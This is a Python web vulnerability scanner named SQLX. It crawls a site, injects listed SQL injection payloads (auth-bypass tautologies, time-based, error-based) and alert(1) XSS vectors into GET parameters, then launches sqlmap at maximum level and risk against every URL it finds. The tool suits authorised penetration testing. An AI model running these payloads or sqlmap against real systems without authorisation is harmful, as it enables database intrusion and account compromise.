import requests
import argparse
from urllib.parse import urljoin, urlparse, urlencode
import subprocess
from bs4 import BeautifulSoup
from time import strftime


#  -------------------
# | GLOBAL CONSTANT'S |
#  -------------------

SQLI_PAYLOADS = [
    "'",
    "' OR 1=1 --", # Authentication Bypass (Tautology)
    '" OR 1=1 --', # Authentication Bypass (Tautology)
    "' OR 1=1#", # Authentication Bypass (Tautology)
    "' OR 1=1/*", # Authentication Bypass (Tautology)
    "' OR '1'='1", # Authentication Bypass (Tautology)
    "' OR 1=1-- -", # Authentication Bypass (Tautology)
    "' ORDER BY 1--", # UNION-Based SQLi
    "' ORDER BY 10--", # UNION-Based SQLi
    "' AND 1=1--", # Blind Boolean-Based SQLi
    "' AND 1=2--", # Blind Boolean-Based SQLi
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Blind Time-Based SQLi
    "x'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR'z", # Blind Time-Based SQLi
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", # Blind Time-Based SQLi
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--", # Blind Time-Based SQLi,
    "' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--", # Error-Based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version))--", # Error-Based SQLi
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--" # Error-Based SQLi
    
]

XSS_PAYLOADS = [
    "<svg/onload='alert(1)'><svg>",
    "<svg onload='alert(1)'><svg>",
    "<svg	onload='alert(1)'><svg>",
    "<svg onload='alert(1)'><svg>",
    "<img src='x' onerror='alert(1)'>",
    "<script>alert(1)</script> ",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

TIMEOUT=5


#  -------------------
# | Banner of Program |
#  -------------------

def banner():
    banner = """
 ___________________________________________________
| ================================================= | 
|| ███████╗ ██████╗ ██╗                   ██╗  ██╗ ||
|| ██╔════╝██╔═══██╗██║                   ╚██╗██╔╝ ||
|| ███████╗██║   ██║██║         █████╗     ╚███╔╝  ||
|| ╚════██║██║▄▄ ██║██║         ╚════╝     ██╔██╗  ||
|| ███████║╚██████╔╝███████╗              ██╔╝ ██╗ ||
|| ╚══════╝ ╚══▀▀═╝ ╚══════╝              ╚═╝  ╚═╝ ||
+ ------------------------------------------------- +
| ================== by Hanamaru ================== |                                               
+ -------------------____________------------------ +   

    """

    return banner


#  --------------------
# | Auxiliar Functions |
#  --------------------

def is_valid_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ("http", "https")

def is_same_domain(base_url, target_url):
    return urlparse(base_url).netloc == urlparse(target_url).netloc


# ----------------
#| Simple Crawler |
# ----------------

def crawler(start_url):
    to_visit = [start_url]
    visited = set()

    urls = []

    while to_visit:
        current_url = to_visit.pop(0)

        if current_url in visited:
            continue

        visited.add(current_url)

        try:
            response = requests.get(current_url, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        
        urls.append(current_url)

        soup = BeautifulSoup(response.text, "html.parser")

        for link in soup.find_all("a"):
            href = link.get("href")

            if not href:
                continue

            full_url = urljoin(current_url, href)

            if not is_valid_url(full_url):
                continue

            if not is_same_domain(start_url, full_url):
                continue

            if full_url not in visited and full_url not in to_visit:
                to_visit.append(full_url)
    
    return urls


#  ------------------------------
# | Extraction of GET Parameters |
#  ------------------------------

def extract_get_parameters(url):
    parsed = urlparse(url)
    params = {}

    if parsed.query:
        for pair in parsed.query.split("&"):
            if "=" in pair:
                key, _ = pair.split("=", 1)
                params[key] = "test"
    
    return params


#  ----------------------
# |SQL Injection Scanner |
#  ----------------------

def scan_sqli(url, file_name):
    params = extract_get_parameters(url)

    #Base request (without payload)
    base_query = urlencode(params)
    base_url = f"{url.split('?')[0]}?{base_query}"

    try:
        base_response =  requests.get(base_url, timeout=TIMEOUT)
        base_len = len(base_response.text)
    except requests.RequestException:
        return
    
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            # Simple Heuristic:
            # Diference in size of response
            diff = abs(len(response.text) - base_len)

            if diff > 50:
                text = "-" * 60
                text += "\n"
                text += "*" * 60
                text += "\n"
                text += "[+] FOUND A POSSIBLE SQL INJECTION\n"
                text += "*" * 60
                text += "\n"
                text += "-" * 60
                text += "\n"
                text += f"    URL: {test_url}"
                text += "\n"
                text += f"    Parameters: {param}"
                text += "\n"
                text += f"    Payload: {payload}"
                text += "\n"
                text += f"    Response's diference: {diff}"
                text += "\n"
                text += "-" * 60
                text += "\n"
                print(text)
                text += "\n"
                generate_report(file_name, text)


#  ----------
# | XSS Scan |
#  ----------

def scan_xss(url, file_name):
    params = extract_get_parameters(url)

    if not params:
        return
    
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            query = urlencode(test_params)
            test_url = f"{url.split('?')[0]}?{query}"

            try:
                response = requests.get(test_url, timeout=TIMEOUT)
            except requests.RequestException:
                continue

            if payload in response.text:
                text = "-" * 60
                text += "\n"
                text += "*" * 60
                text += "\n"
                text += "[+] FOUND A POSSIBLE REFLECTED XSS\n"
                text += "\n"
                text += "*" * 60
                text += "\n"
                text += "-" * 60
                text += "\n"
                text += f"    URL: {test_url}"
                text += "\n"
                text += f"    Parameters: {param}"
                text += "\n"
                text += f"    Payload: {payload}"
                text += "\n"
                text += "-" * 60
                text += "\n"
                print(text)
                text += "\n"

                generate_report(file_name, text)


#  -------------
# | Call SQLMAP |
#  -------------

def run_sqlmap(url, file_name):
    cmd = [ 
        "sqlmap", 
        "-u", 
        url, 
        "--batch",
        "--level=5",
        "--risk=3",
        "--random-agent"
    ]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    for line in process.stdout:
        print(line.rstrip())
        text = line.rstrip()
        text += "\n"

        generate_report(file_name, text)

    process.wait()


#  --------------------------
# | Generator of Report Name |
#  --------------------------

def generate_report_name():
    timestamp = strftime("%d%m%Y-%H%M%S")
    file_name = f"sqlx_report_{timestamp}.txt"
    return file_name


#  ------------------------------
# | Writer Header of Report File |
#  ------------------------------

def generate_report_title(file_name):
    with open(f"./reports/{file_name}", "w", encoding='utf-8') as f:           
        text = banner()
        text += "\n"
        text +=f"Report generated in: {strftime('%d/%m/%Y')}\n\n\n"
        f.write(text)


#  --------------------------------
# |Write A Output Data's in Report |
#  --------------------------------

def generate_report(file_name, text):
    with open(f"./reports/{file_name}", "a", encoding='utf-8') as f:           f.write(text)


# *================*
# | Main execution |
# *================*

def main():
    print(banner())
    report_file_name = generate_report_name()
    generate_report_title(report_file_name)
    parser = argparse.ArgumentParser(prog="SQLX", description="SQLX - A SQLI and XSS Scaner.")
    parser.add_argument("--url", "-u", help='example: http://testphp.vulnweb.com')
    args = parser.parse_args()
   
    print(f"[*] Starting crawler at {args.url} ...")
    urls = crawler(args.url)

    print(f"[*] Total URLs has found: {len(urls)}\n")

    print(f"[*] Starting XSS and SQLI scanners...\n")

    for url in urls:
        scan_xss(url, report_file_name)
        scan_sqli(url, report_file_name)
    
    print("\n\n[*] Starting SQLMap...\n\n")

    for url in urls:
        print(url)
        run_sqlmap(url, report_file_name)
        
    
    print("Scans has been finshed.\n")
    print(f"A new report has been generate in ./reports/{report_file_name}")

if __name__ == "__main__":
    main()
